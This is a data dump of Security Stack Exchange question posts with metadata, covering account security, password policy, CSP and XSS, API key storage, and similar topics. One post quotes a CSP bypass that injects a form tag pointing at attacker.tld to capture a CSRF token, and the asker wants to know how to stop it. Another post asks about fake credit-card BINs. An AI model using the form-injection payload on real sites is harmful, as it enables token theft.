"159500","1","159515","","2017-05-15 09:37:10","","2","1425","<p>I am doing an audit on a website, and discovered that you could create different accounts with the same username, but different passwords.</p>

<p>an user 'a' with password 'a' will have a different account than user 'a', but with password 'b'.</p>

<p>I have the feeling that this behavior is wrong, but I don't clearly see what is the risk in doing so.</p>

<p>There is no account recovery system on the website for now.<br>
login failure says ""wrong username or password"", so it doesn't disclose existing users.</p>

<p>Could you explain me what are the risks of providing this behavior?</p>
","147494","","","","","2018-11-15 16:35:40","Website allowing different accounts with same username","<account-security>","3","6","","","","CC BY-SA 3.0"
"159532","1","","","2017-05-15 14:22:04","","0","245","<p>This question is quite basic, but it bugs me and I'm sure it bugs a lot of other people as well.</p>

<p>What is the <em>real</em> security benefit to forcing users to change their password say every 60 days or every 90 days?</p>

<p><strong>Benefits</strong></p>

<ul>
<li>Compromised credentials are useless after a short period of time.</li>
</ul>

<p><strong>Drawbacks</strong></p>

<ul>
<li>User resorts to easily remembered password increment schemes&mdash;<em>password1</em>, <em>password2</em>, <em>passwordN</em>.</li>
<li>User is forced to expose passwords on other mediums to recall them&mdash;<em>post-it</em> note, other devices, etc.</li>
<li>User has to reference exposed passwords increasing vectors for attack, as compared to a recalled-from-memory password.</li>
</ul>

<p>It seems there are more drawbacks than benefits, so why is this security practice so prevalent?</p>

<p>Update from FTC article which shares some of my concerns:</p>

<blockquote>
  <p>The Carleton researchers also point out that an attacker who already
  knows a user’s password is unlikely to be thwarted by a password
  change. As the UNC researchers demonstrated, once an attacker knows a
  password, they are often able to guess the user’s next password fairly
  easily. In addition, an attacker who has gained access to a user’s
  account once may be able to install a key logger or other malware that
  will allow them to continue to access the system, even if the user
  changes their password.</p>
</blockquote>

<p>Similarly, they share the same hypothesis.</p>

<blockquote>
  <p>While we don’t yet have a controlled study demonstrating the impact of password expiration policies on user behavior, there is quite a bit of evidence to suggest that these policies may be counterproductive.</p>
</blockquote>

<p>Link: <a href=""https://www.ftc.gov/news-events/blogs/techftc/2016/03/time-rethink-mandatory-password-changes"" rel=""nofollow noreferrer"">Time to rethink mandatory password changes</a></p>
","49963","","49963","","2017-05-15 14:25:58","2017-05-16 09:13:39","Is there any real security benefit to forced password change intervals?","<passwords><password-management><account-security>","2","0","","2017-05-15 18:24:37","","CC BY-SA 3.0"
"227805","1","","","2020-03-26 13:14:23","","1","6634","<p>I was on the Kik messenger app, and someone in a group chat posted screenshots of his modded Kik app that contains an ""IP grabber"". He said he could hack people easily, and was very fast to tell me my own IP address. He was able to tell when anyone in the chatroom was lurking (i.e watching the chat without typing), for how long, their last activity, etc. I have no idea how, but he was able to know my IP address along with 2 other people in the chatroom. Prior to this, he had sent me a picture which I downloaded a week ago. He has not sent me any links, and I have certainly not clicked on any links from him. We had a few messages back and forth, but that's it. He said that he would hack me, so I logged out a few hours later. I used AVG antivirus and Kaspersky to scan my phone, and there were no issues detected. I manually checked my downloaded apps on Android, and there wasn't any downloaded app that was new. I have since then logged out of Kik, but I am concerned: could he be spying on my phone, and what can I do to prevent this?</p>
","227746","","6253","","2020-03-26 13:24:08","2021-09-01 16:07:00","Could modded versions of Kik messenger pose a security threat to other Kik users?","<account-security>","4","2","","","","CC BY-SA 4.0"
"18924","1","18940","","2012-08-20 15:34:10","","13","6218","<p>I consider myself to be reasonably good with IT, however I am relatively fresh at server and system administration. I am a web developer for my company and I have been charged with setting up and migrating to a new VPS to get away from the shared hosting my company has been on for ages.</p>

<p>In this process, I have spent almost a week now hardening the server (security became an issue, which is why we're moving in the first place) and have gone over and above to harden the server. I've installed and configured ConfigServer Firewall, hardened SSH, only private keys, all the good stuff. But I found a program called <a href=""http://en.wikibooks.org/wiki/Grsecurity"" rel=""nofollow noreferrer"">grsecurity</a> that looks promising, but I guess I'm just curious as to whether or not it's overkill? </p>

<p>Are there things that grsecurity offers that I really need? Or is it something that I can do without? I read something about how it prevents buffer overflows and other things, however I am just curious as to whether this is worthwhile, as I don't want to add so many moving parts to the security of this server that I end up falling on my face.</p>

<p>I appreciate any feedback you can give me, or links to tutorials/information that you may have!</p>

<p>For what it's worth, the server environment is as follows:</p>

<ul>
<li>Linode VPS 2048</li>
<li>CentOS 6.3</li>
<li>PHP 5.4.5</li>
<li>ConfigServer Firewall</li>
</ul>

<p>Again, I appreciate whatever feedback you can offer me! I trust this community implicitly, and I know you guys know what you're talking about!</p>
","12341","","106285","","2018-02-27 06:59:57","2018-02-27 06:59:57","Is server hardening with grsecurity really necessary on the CentOS 6.3 environment?","<firewalls><webserver><hardening><grsecurity>","2","1","","","","CC BY-SA 3.0"
"229065","1","","","2020-04-01 09:02:21","","2","160","<p>I was recently reading <a href=""https://security.stackexchange.com/questions/229004/how-fast-can-hackers-change-their-ip-address"">this question</a>, where the <a href=""https://security.stackexchange.com/a/229005/69496"">accepted answer</a> claims that it is easy for attackers to bypass rate limiting that is based on IP, which makes any sort of IP rate limiting to prevent a brute force attack much less useful. But, if it is based on the account that is a victim, then it becomes very easy for an attacker to block access to a victim's account. What is the best way to defend against both account-level DOS attacks and online brute force attacks (and anything else that is in this same category)?</p>

<p>Simply sleeping for, for example, 1 second isn't sufficient because the attacker can simply put in more requests before the first one finishes (1 second latency, but unbounded throughput, and throughput is what matters for brute force). If subsequent requests are blocked until the first one finishes, then they must be blocked per-IP or per-user, which produces the same problem.</p>

<p>2FA isn't always a good solution either, because, for worse, many people fail to use it. </p>
","69496","","6253","","2020-04-01 09:16:49","2023-06-17 19:00:20","How can one mitigate both account-level DOS attacks and online brute force attacks at the same time?","<passwords><brute-force><account-security><denial-of-service>","1","6","","","","CC BY-SA 4.0"
"229263","1","229265","","2020-04-05 07:57:00","","-1","104","<p>I try to avoid big internet companies (big tech) and try to find decentralized and/or open source alternatives.</p>

<p>I use a password manager with unique usernames and generated, complex passwords.</p>

<p>A lot of accounts have accumulated in the last 10+ years and I wonder why do I have to delete an account instead of simply no longer using it?</p>

<p>As is known, the corporations never really delete any data, but set a flag ""deleted"". One can also assume that they will continue to sell and analyze the collected data.</p>

<p>In the case of leaks/hacks my account could not be affected. Are there any other reasons related to privacy? I am mainly talking about accounts without public postings.</p>

<p>The companies intentionally make deleting accounts very time-consuming and difficult. Is it worth the effort? Why?</p>
","16066","","","","","2020-04-05 09:05:38","Privacy: why do I have to delete an account instead of simply no longer using it?","<privacy><account-security><cloud-computing><user-tracking>","1","2","","","","CC BY-SA 4.0"
"19155","1","19801","","2012-08-23 21:07:38","","58","11221","<p>Do security images such as those presented upon logging into banks provide any tangible security benefits, or are they mostly theater?</p>

<p>Per my understanding, if somebody is phishing your users, it's also trivial for them to proxy requests from your users to your authentic website and retrieve the security image with whatever credentials the user provides before receiving the image (e.g., the username). If this is the case, security images seem to provide no additional security, and may actually be harmful if they help convince users that a malicious website is legitimate.</p>

<p>Am I missing something?</p>
","12407","","21234","","2013-05-02 04:33:00","2015-04-17 14:35:28","Effectiveness of Security Images","<authentication><phishing><security-theater><sitekey><security-seal>","4","5","","","","CC BY-SA 3.0"
"19253","1","","","2012-08-24 21:28:35","","6","14018","<p>While looking at various hard drive encryption methods, I discovered that HP's ""DriveLock"" is not quite the standard ATA security system. While I did get confirmation from HP that it does indeed use ATA security commands to lock and unlock the drive, I'm curious what it does to my password.</p>

<p>Moving a DriveLock'ed drive from one HP system to another (with different firmware) resulted in the password being incorrect. If I moved it to a different system with the same firmware, it worked. </p>

<p>I locked a drive with a ThinkPad that uses the normal HD Password setting, and the HP was unable to unlock it. </p>

<p>I suspect that HP DriveLock is mangling the password (or hashing it, or something) that you give it and giving the drive a completely different password. </p>

<p>I'm curious if anyone knows what DriveLock may be doing. My main concern is that if we lose an HP system when we don't have a same model, that drive becomes useless unless we can acquire another laptop with the same firmware that locked the drive.</p>
","10451","","63999","","2023-08-22 16:44:23","2023-08-22 16:44:23","What does HP DriveLock do to your password?","<bios><device-locking><hard-drive><ata-security>","2","2","","","","CC BY-SA 3.0"
"229483","1","","","2020-04-09 04:39:06","","0","45","<p>Also I had it for around 3 days. It downloaded a file that's 1kb big on my PC. What should I do? I'm afraid to use my PC again.</p>
","224090","","","","","2020-04-09 04:39:06","My PC was infected by belombrea dot com. Kaspersky didn't detect it. Is a factory reset enough?","<malware><account-security><anomaly-detection>","0","3","","2020-04-09 07:23:15","","CC BY-SA 4.0"
"93196","1","","","2015-07-06 07:12:52","","1","1681","<p>I am using CCSVM tool SCAN for Network devices (Cisco). Below you can find the scan result:</p>

<blockquote>
  <p>Title vulnerability: NTP: Traffic amplification in clrtrap feature of
  ntpd Solution fix: Disable NTP queries Apply a restrict option to all
  hosts that are not authorized to perform NTP queries. For example, to
  deny query requests from all clients, put the following in the NTP
  configuration file, typically /etc/ntp.conf, and restart the NTP
  service:<br>
         restrict -4 default nomodify nopeer noquery notrap
         restrict -6 default nomodify nopeer noquery notrap</p>
</blockquote>

<p>Please help check this vulnerability on Cisco Network devices. Are they affected or not affected? What should be the solution if these are vulnerable?</p>
","80353","","80353","","2015-07-09 16:43:43","2015-07-09 16:43:43","Vulnerability NTP:Traffic amplification in clrtrap feature of ntpd affect or not affect to Cisco device?","<audit><security-theater><dnssec><mod-security><content-security-policy>","0","0","","","","CC BY-SA 3.0"
"229607","1","","","2020-04-10 17:14:42","","0","679","<p>Many companies have some BINs where you can enter a fake credit card and you get a premium account (the Credit card is based on a BIN that just trick or bypass the plateform), </p>

<p>I want to know how this works ?</p>

<p>For example : bin spotify/netflix etc.. 5273XXXXXXXX </p>

<p>How people can discover these bins ? And how/why they work ? </p>
","231909","","","","","2020-06-16 14:31:09","How does BINs vulnerabilities work?","<account-security><data-validation>","1","2","","","","CC BY-SA 4.0"
"229637","1","","","2020-04-11 08:17:50","","0","1107","<p>I just had this security alert about one of my Google accounts:</p>

<ul>
<li>Device : Unknown device</li>
<li>Time : 25 minutes ago</li>
<li>Place : United States</li>
<li>IP Address : 2a00:1450:4864:20::51b</li>
</ul>

<blockquote>
  <p>Someone just used your password to try to connect to your account from an application not belonging to Google, we have blocked this person.</p>
</blockquote>

<p>This alert arrived 30 minutes after I had made some security modifications and checks on my account. Moreover, I verified this IPV6 address, and it belongs to Google (I am using a VPN). Is it a false positive? 🤔</p>
","86376","","86376","","2020-04-11 10:17:08","2020-04-11 10:35:26","False positive security alert from Google?","<authentication><account-security><google>","2","0","","","","CC BY-SA 4.0"
"19615","1","","","2012-09-01 15:04:13","","1","123","<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://security.stackexchange.com/questions/18958/are-there-any-tools-that-focus-on-shellcode-analysis"">Are there any tools that focus on shellcode analysis?</a>  </p>
</blockquote>



<p>Any tools available that is for shellcode analysis? what methods are used in reverse engineering?</p>
","12631","","-1","","2017-03-17 10:46:01","2012-09-01 15:04:13","What is the smallest possible Windows shellcode?","<web-browser><threat-modeling><security-theater>","0","2","","2012-09-01 16:04:43","","CC BY-SA 3.0"
"229789","1","229791","","2020-04-14 15:38:09","","0","1634","<p>In our web app, we need to allow users to input rich text which is then presented to other users. We are looking for a simple WYSIWYG (JavaScript) editor that outputs a format which is backwards compatible with plain text (to support existing text in our database), has simple rich-text formatting support (bold/italic/underline/bullets/blockquote/etc) and a frontend renderer that accepts the output and can display it, while not being able to introduce any HTML tags at all. This will greatly diminish the chance of XSS.
I could not find any major project that does this.</p>

<p>We are currently implementing the following to evade XSS:</p>

<ol>
<li>CSP</li>
<li>iframe sandbox</li>
<li>All important cookies are HttpOnly</li>
<li>Using a renderer that does now render scripts, like markdown-it or react-markdown.</li>
</ol>

<p>That being said, it still feels like here is a major gap in the ecosystem. There is no editor + renderer that works with something like reStructedText or BBCode, or some other format with no support for HTML tags or advanced functionality. Most editors and renderers work with Markdown, which is problematic. We'd love something super simple that will allow basic features with a minimal amount of exposed surface.</p>

<p>Does anyone have any recommendations on how to tackle this challenge?</p>
","116564","","6253","","2020-04-14 15:41:05","2020-04-14 16:32:05","WYSIWYG Rich text editor and renderer with no XSS risks","<xss><cookies><html><content-security-policy><iframe>","1","0","","","","CC BY-SA 4.0"
"160713","1","","","2017-05-29 16:23:32","","1","181","<p>i allow members to sign up/ login in using external logins (social networks and such), the problem is that, if i didn't ask them to confirm their emails then how would i validate their ownership to this email (assuming the social account wasn't theirs) which then will mark my mail as spam</p>

<p>second, for security purposes, i force users that wish to change their email before confirmation or resend the confirmation to same email to enter their password, which wouldn't exist in the case of external login unless i ask for it (which is forcing the user to do extra steps)</p>

<p>so it's being completely secure with extra way to login other than the social network account vs convenience and ease of the signing up process, so which should i use, or should i let the user decide, <strong>but would it matter from a security perspective?</strong></p>
","148615","","","","","2017-05-29 16:48:59","external logins having to confirm email","<authentication><passwords><email><password-management><account-security>","1","0","","","","CC BY-SA 3.0"
"160723","1","","","2017-05-29 17:48:56","","5","4554","<p>I've seen a few questions here with similar concerns but i felt like this specific question wasn't asked or replied to, so I'll try my best to illustrate my case here.</p>

<p>The problem:</p>

<ul>
<li>The platform I'm developing consists of a ""3rd party APIs"" function aggregator and normalizer as in: my users will provide their API KEYS and i have to store them</li>
<li>Users need to provide several API KEYs for 3rd party APIs</li>
<li>The application needs to API Calls on behalf of the user, even when the user isn't logged in ( during background tasks )</li>
<li>When calling 3rd party APIs I'll need the cleartext form of those keys and secrets</li>
</ul>

<p>My infrastructure:</p>

<ul>
<li>I currently use Heroku ( for my http server ) which theoretically guarantee nobody can access my machines via SSH or other means</li>
<li>My pass guarantees only a selected amount of users ( ideally using 2 factor authentication ) have access to the control panel, therefore to the ENV variables, therefore to the database credentials</li>
</ul>

<p>My current plan:</p>

<ul>
<li>Store API KEYS on a separate server which issues its own token for future authentication</li>
<li>Only accept API calls from my own http servers ( using some sort of private VPN )</li>
<li>Exposes an API which only gives access to a few selected functions then used by my other servers, this way reducing the attack surface of my system to only this machine with minimal software installed ( a minimal node.js http api ).</li>
</ul>

<p>My pass recommendation:</p>

<ul>
<li>Use heroku to run my ""key manager servixe""</li>
<li>Store database credentials on ENV variables and don't give access to this account to anyone other than the ""keys admin"" which will be the only person able to login into the pass dashboard and see the database address/credentials</li>
</ul>

<p>Questions:</p>

<ul>
<li>What is the most secure way to store and use those keys?</li>
<li>Is there any option that is more secure than simply storing the keys on a database which the address/credentials are protected by a two-factor authenticated dashboard?</li>
</ul>

<p>Thank You</p>
","77849","","77849","","2017-05-29 22:56:23","2017-09-10 06:23:47","How to securely store and use 3rd party API Keys?","<encryption><password-management><account-security>","1","3","","","","CC BY-SA 3.0"
"229871","1","","","2020-04-15 19:07:31","","0","268","<p>I would like to assess the actual risk for various CORS attacks when a web application properly sets CSP and other response headers, but the app server error page does not. When a 40x can be provoked by trying to access protected content, for example, can the error response be used to inject malicious scripts, even though the web application is protected? I just can't envision a scenario where this is done.</p>

<p>Or x-content-type-options: nosniff. It is missing from a 400 error page. Is this a real vulnerability? What can an attacker do with the error response?</p>
","107401","","","","","2020-05-18 09:04:40","Security headers in application vs. Tomcat default 40x error","<web-application><content-security-policy><tomcat>","1","0","","","","CC BY-SA 4.0"
"229882","1","","","2020-04-15 22:05:38","","0","579","<p>Let's say I have a simple web application which uses a single JavaScript (JS) file, loaded from its own domain, and has implemented the restrictive Content Security Policy (CSP) of <code>default-src 'self'</code>. There's a stored XSS in it whereby the JS file will make an Ajax call to an API which would return some content stored in a database, and that content (which came from untrusted user input) has inline JavaScript in it. The JS file creates an element in the page's document and sets its HTML content to the retrieved content. Let's assume that this is the necessary way of doing what it needs to do, and let's assume that sanitising/encoding the input is unfeasible. <em>I know that user input should always be sanitised, just for the purposes of this question, skip this suggestion as a solution.</em></p>

<p><strong>Is there any way to set a CSP such that this inline JavaScript, dynamically put onto the page by trusted JavaScript, is blocked?</strong></p>

<p>Here's a minimal working example (you may need to serve it from a simple HTTP server, e.g. <code>php -S localhost:58000</code>, rather than loading as an <code>.html</code> file)</p>

<p><code>csp-test.html</code>:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=""UTF-8"" /&gt;
    &lt;meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'""&gt;
    &lt;script charset=""utf-8""&gt;
      console.log('script') // blocked, OK
    &lt;/script&gt;
    &lt;script src=""csp-test.js"" charset=""utf-8""&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;img src=""x"" onerror=""console.log('img')""/&gt; &lt;!-- blocked, OK --&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p><code>csp-test.js</code>:</p>

<pre><code>window.addEventListener('load', () =&gt; {
  console.log('trusted ext script') // executed, OK
  i = document.createElement('img')
  i.src = 'y'
  i.addEventListener('error',
    function(){ console.log('img by trusted ext script'); }) // executed, HOW TO BLOCK THIS?
  document.body.append(i)
})
</code></pre>

<p>result:</p>

<p><a href=""https://i.stack.imgur.com/KWAjA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KWAjA.png"" alt=""enter image description here""></a></p>

<hr>

<p><strong>EDIT:</strong></p>

<p>As @user2313067 pointed out, it was not being blocked because the event handler was registered by the script and not by an <code>&lt;img</code> attribute. When I create an element from a string, which contains such an inline JavaScript, it is blocked, as in:</p>

<pre><code>window.addEventListener('load', () =&gt; {
  console.log('trusted ext script') // executed, OK
  p = document.createElement('p')
  p.innerHTML = ""&lt;img src='y' onerror=\""console.log('img by trusted ext script')\""/&gt;"" // blocked, OK
  document.body.append(p)
})
</code></pre>

<p>I guess this solves this question. I was under the impression that the behaviour I was seeing in the web application in question (where the API fetches HTML as a JSON from an API and renders it onto the page) uses exactly <code>innerHTML</code> as in my second example. So I was perplexed as to why the inline JavaScript which the API serves is not blocked. But apparently, it does a more complicated transformation before rendering onto the page...</p>
","163461","","163461","","2020-04-18 21:49:53","2020-04-18 21:49:53","CSP: any way to prevent inline scripts dynamically created by a trusted external script?","<content-security-policy>","0","2","","","","CC BY-SA 4.0"
"229887","1","230005","","2020-04-16 00:52:01","","0","292","<p>We have set up Modsecurity CRS with Nginx and we are in the phase of customization (or writing the exclusion rules).</p>
<p>We'd like to know if it is possible that modsec can only log the exception for certain URIs without adding up the score while the rest of the URIs still being protected. Or, whenever it tries to return Access Deny, it will check if it for certain URIs first. I've read a couple of tutorials and they suggest either setting detection mode or the threshold to a huge number, while we'd like to start the protection now but don't want to affect certain URIs as they are critical for business. If modsec finds rules violation for those URIs, we'd like modsec to log it only and we'll write exclusion rules after reviewing the logs.</p>
<p>Modsec verion: v3.0.3</p>
<p>Nginx version: 1.13.6</p>
","232327","","6253","","2020-07-06 20:23:58","2020-07-06 20:23:58","For certain URI, is it possible to log the rule violation instead of returning access deny?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"93604","1","","","2015-07-10 17:14:59","","0","150","<p>While using a Chromium based browser (Chromodo) and doing a regular Google search, Evernote is now appearing on the side with ""related results in your notes"".  </p>

<p>Does anyone know how they are doing it?</p>

<p>*I cannot see any additional plugins (extensions) in the list.</p>

<p>I am wondering if this is source of concern for security and/or privacy.  Does it send the search to the online site or it searches locally in my database.  Also, does it notify the ""in notes result"" to any 3rd party such as Google?</p>
","78980","","","","","2015-07-10 19:03:23","Should a Web Search with Evernote results be a concern?","<privacy><google><chrome><research><content-security-policy>","1","4","","","","CC BY-SA 3.0"
"160776","1","","","2017-05-30 10:38:34","","1","1676","<p>This <a href=""https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/"" rel=""nofollow noreferrer"">article</a> talks about bypassing CSP using Form tags.</p>

<p>Edit: As suggested, details has to be provided in case the external link stops working.  </p>

<p>So here are the details:</p>

<p>There is content-security-policy in place and a vulnerable parameter to XSS:</p>

<pre><code>Content-Security-Policy: default-src ‘none’; 

&lt;html&gt;

&lt;body&gt;

&lt;div&gt;[Reflected XSS vulnerability here]&lt;/div&gt;

&lt;form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”&gt;

&lt;input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” /&gt;

&lt;input type=”submit” value=”Subscribe to newsletter” /&gt;

&lt;/form&gt;

&lt;/body&gt;

&lt;/html&gt; 
</code></pre>

<p>This is how the author tries to bypass CSP:</p>

<pre><code>Content-Security-Policy: default-src ‘none’; 

&lt;html&gt;

&lt;body&gt;

&lt;div&gt;&lt;form action=”http://attacker.tld”&gt;&lt;/div&gt;

&lt;form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”&gt;

&lt;input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” /&gt;

&lt;input type=”submit” value=”Subscribe to newsletter” /&gt;

&lt;/form&gt;

&lt;/body&gt;

&lt;/html&gt; 
</code></pre>

<p>I want to know is there a way CSP should be implemented to stop the above attack and circumvent the sensitive tokens to be sent to external domain?<br>
Or proper encoding of special characters has to be done to stop this.</p>
","110848","","110848","","2017-05-30 11:34:11","2017-05-30 11:34:11","Bypass Content Security Policy: Using Form tag","<xss><validation><content-security-policy>","1","7","","","","CC BY-SA 3.0"
"160781","1","160782","","2017-05-30 11:50:36","","0","315","<p>Linux (and Unix) users can store in <code>/etc/passwd</code> not only the usual parameters (username, home directory, default shell, ...) but also: their <em>names</em> and <em>surnames</em>, <em>addresses</em>, <em>phone numbers</em>, etc.. In some Linux distributions, <code>finger user1</code> can provide all this information to <code>user1</code>, and also to the other users in the same system and this is as expected.</p>

<p>As regards attackers, instead: who can read the <code>/etc/passwd</code> file can read this information; also, who can gain a <code>user1</code> shell can run <code>finger</code> for any user.</p>

<p>1) Are there other undesirable ways to read those items? </p>

<p>2) What is the recommended way to (hopefully) confidentially and securely store this information?</p>
","56752","","","","","2017-05-30 11:58:44","Security of Linux/Unix user information","<linux><privacy><attacks><account-security><unix>","1","0","","","","CC BY-SA 3.0"
"229954","1","229960","","2020-04-17 12:45:13","","144","27799","<p>I'm pretty sure this is a stupid idea but I'd like to know why, so bear with me for a moment.<br>
Lots of the work backend developers do is providing CRUD access to customers via HTTP, essentially mapping data from and to the internal database. Customers authorize to the web service using some sort of credentials via an encrypted connection, the web service validates data and performs queries against the backend database, then returns the result to the client.  </p>

<p>All in all, this is merely a worse way to interact with the database directly: Almost nobody fully implements the REST specification, and sooner or later you always end up with home-cooked generic filtering, sorting or pagination - while SQL supports all of this already.</p>

<p>That got me wondering: Why not give customers access to the database by exposing the SQL port, skipping the HTTP API entirely? This has lots of advantages:</p>

<ul>
<li>Clients must encrypt connections using a client certificate </li>
<li>We can use the access control built into the server or just use shard databases per customer</li>
<li>(My-)SQL permissions are pretty fine-grained, so I'd wager there shouldn't be any obvious security issues</li>
<li>Performance should be way better, since we skip the entire HTTP communication and web app code</li>
<li>New features are a matter of database migrations, everything is reflected in the schema</li>
<li>Powerful query capabilities are provided to users, without any additional effort</li>
</ul>

<p>The downsides seem to include being unable to support multiple schema versions, even though I think careful deprecations (and client SDKs, maybe) should make the impact minimal.</p>

<p><strong>As nobody seems to do this, there must be a security risk I'm overlooking.</strong> Why can't we provide public SQL access to our customers? What could possibly go wrong? <em>(Please keep in mind that this is just a thought experiment born out of curiosity)</em></p>
","67818","","6253","","2020-04-22 07:18:59","2023-06-13 04:31:22","Why can't I just let customers connect directly to my database?","<account-security><mysql><api>","24","14","","","","CC BY-SA 4.0"
"230014","1","230024","","2020-04-18 09:44:14","","2","963","<p>Can an android app steal a stored password from any other app I have installed?</p>

<p>Say I have snapchat and I only log in once and stay logged in, if I later delete the cache from that app it will log me out. </p>

<p>Are the stored passwords vulnerable?</p>
","232533","","219899","","2020-04-19 08:34:09","2020-04-19 08:34:09","Can an Android app steal cached/stored passwords from other apps on my phone","<cryptography><malware><android><account-security>","2","1","","","","CC BY-SA 4.0"
"230031","1","","","2020-04-18 14:13:32","","2","692","<p>I have a (maybe dumb) question for you. I was wondering if there is a way to know if my router has been hacked. </p>

<p>I secured it the best that I can and also made it so only the mac addresses of the devices that I know can access my WiFi. </p>

<p>I turned off uspn, WPS, and remote access to the router settings even though I noticed that the page won't load anymore on the device I used to set it up but it loads on my phone. </p>

<p>While days ago it would not load on my phone but it would on other devices but I keep seeing accesses to my social medias by devices that seem to be mine but I nor everyone else in my family used lately.</p>

<p>I'm afraid someone hacked my router and is using my devices remotely. How can I be sure? Would calling my ISP help? My router is from my ISP. </p>
","232548","","219899","","2020-04-18 17:48:45","2020-04-19 13:20:53","How to know if my router has been hacked?","<network><wifi><account-security><router><wps>","2","0","","","","CC BY-SA 4.0"
"230081","1","230082","","2020-04-19 05:59:16","","1","457","<p>I'm sure everybody knows the e-mails that many web services send out when you log into your account from an unknown device or geo-location to inform you about suspicious login activity.</p>

<p>The problems start as soon as one doesn't attempt the login him-/herself and this mail could actually indicate that some adversary tried to access one's account. This happened to a relative of mine about a month ago with their e-mail, their Facebook and Steam account. All pretty much at the same time. The Steam emails even suggested that the attacker was in fact able to log into the account.</p>

<p>We immediately took action by changing passwords for most of their internet accounts and (finally) activating 2-Factor Authentication where possible. But, over the last days, Facebook reported multiple failed login attempts again.</p>

<p>As far as I can tell, all the mails that were received were genuine. The links in them pointed to the real websites and they (especially for the ones from Steam) looked like the real deal. So I assume that there were in fact multiple attempts to break into the accounts (and maybe even a successful login in case of Steam).</p>

<p>What steps can we take to prevent these hacking attempts in the future? Or is it only possible to minimize the success rate of such attacks by choosing strong passwords, 2FA, etc.?</p>
","232601","","6253","","2020-04-19 08:20:51","2020-04-19 08:20:51","How to prevent attempts to log into my accounts?","<account-security>","1","0","","","","CC BY-SA 4.0"
"230094","1","","","2020-04-19 14:55:25","","0","33","<p>I recently started learning about pentesting, and I tried to see the request body of a website that I use frequently, and that's what I saw:</p>

<p><a href=""https://i.stack.imgur.com/va0HZ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/va0HZ.png"" alt=""u""></a></p>

<p>(""senha"" means ""password"" in portuguese and ""entrar"" means ""to enter""). My question is: Is this a correct approach? I mean, can someone intercept this data and get my password? And how could this be possible?</p>
","232628","","","","","2020-04-19 14:55:25","Sending password plain text in POST body is safe?","<account-security>","0","3","","2020-04-19 15:14:28","","CC BY-SA 4.0"
"161027","1","","","2017-06-02 08:45:28","","0","165","<p>As we know most of the malwares create thousands of domains and subdomains using DBA for setting C&amp;C communications. The domain names are controlled by Internet Corporation for Assigned Names and Numbers (ICANN) at the top level. Is it feasible for ICANN to ask all registrars for integration of OTP (One time Password) for domain registrations. Which means for each domain registration , the registrar would send a OTP to a mobile and domain will get registered only after OTP authentication. 
This should put limits on automated domain registrations as well as can provide a trace to registered mobile number.
Is this feasible to implement ?</p>
","108636","","","","","2017-09-30 19:21:29","limiting automated domain creation by malware","<malware><ransomware><security-by-design>","2","1","","","","CC BY-SA 3.0"
"161112","1","161113","","2017-06-03 09:41:40","","4","429","<p>So I get these questions quite a lot recently from friends or family. And I thought this could be a good question for Security Exchange, because I couldn't find this kind of question here.</p>

<p>I recieved questions like:</p>

<blockquote>
  <p>Should I install program 'x' promising me to clean files from my
  computer?</p>
</blockquote>

<p>A few examples: '<em>Dr. Cleaner [mac], Cleanmaster [Android], CCleaner [Windows]</em>'</p>

<p>I always advise against, because I feel like there are security risks involved. You give lots of privileges to applications that have no real benefit, since most of this is built into the OS anyway</p>

<p><strong>Am I right in this assumption?</strong></p>
","148081","","148081","","2017-06-05 21:00:45","2017-06-05 21:00:45","Cleanware. What does it do and are there security risks involved?","<malware><software><security-theater>","1","1","","","","CC BY-SA 3.0"
"161142","1","161150","","2017-06-03 19:08:27","","2","3662","<p>so let's say I had a basic socket, doesn't give you any information about the user other than the IP address, what would be my options If I wanted to authenticate a user in the most optimal way possible (as in performant),</p>

<p>I thought of having a small key that I hash the packet with, which could be de-hashed quite fast (I think) - but I don't know how I could securely send that initial key. (Although maybe with a secondary SSL server, which I will have for HTTPS requests)</p>

<p>Edit: More Info, the user authenticates with the HTTPS server first, so a key can indeed be shared securely (with SSL) between the client and the server</p>

<p>Thoughts?</p>
","78932","","78932","","2017-06-03 20:23:04","2017-06-03 21:27:04","Authenticate a user thru a UDP socket","<authentication><server><account-security><udp><performance>","2","4","","","","CC BY-SA 3.0"
"230293","1","230297","","2020-04-22 00:27:50","","0","4550","<p>Situation: My phone is an android (Samsung Galaxy s6) - In a moment of mindless distraction yesterday I opened a pdf in a phishing email - it did contain a link but I did not click it. Very shortly afterwards, I went to Facebook and it had logged me out, which it never does. This made me suspicious that there was indeed malicious code in that pdf so I installed Bitdefender Mobile. The scan was clear (and I've now repeated it several times). But then my banking app asked for extra authentication than it normally does so now I remain concerned that my phone is compromised but Bitdefender isn't catching it. <br><br>My questions are: Is it likely that malware is being missed? And now that I have activated the App Lock feature in Bitdefender, does that protect me if there happens to be malware on my phone that is designed to steal credentials? Couldn't the malicious code just lift the credentials for App Lock like everything else, thereby rendering it useless?</p>
","232865","","","","","2020-04-22 05:15:57","How to make sure my phone is secure after a phishing attempt?","<malware><android><account-security><antimalware>","2","3","","","","CC BY-SA 4.0"
"230320","1","","","2020-04-22 11:04:08","","0","19","<p>I built new web application. <br>
In my login system I make remember me check box, <br>
If user clicks on that then his/her username and password will stored in cookies so for next time they will logged in without any asking those credentials. Is that a secure way? or what else a good way for better security issue?</p>
","232714","","6253","","2020-04-22 11:06:30","2020-04-22 11:06:30","If I store users username and password in cookies, for next time users logged in if they were clicked the remember me, is that a good idea?","<authentication><web-application><cookies><account-security>","0","3","","2020-04-22 11:08:43","","CC BY-SA 4.0"
"94070","1","94082","","2015-07-16 05:29:58","","12","4760","<p>As you can see from the tag, I know that <a href=""https://en.wikipedia.org/wiki/Security_through_obscurity"" rel=""nofollow"">security by obscurity</a> is not true security.</p>

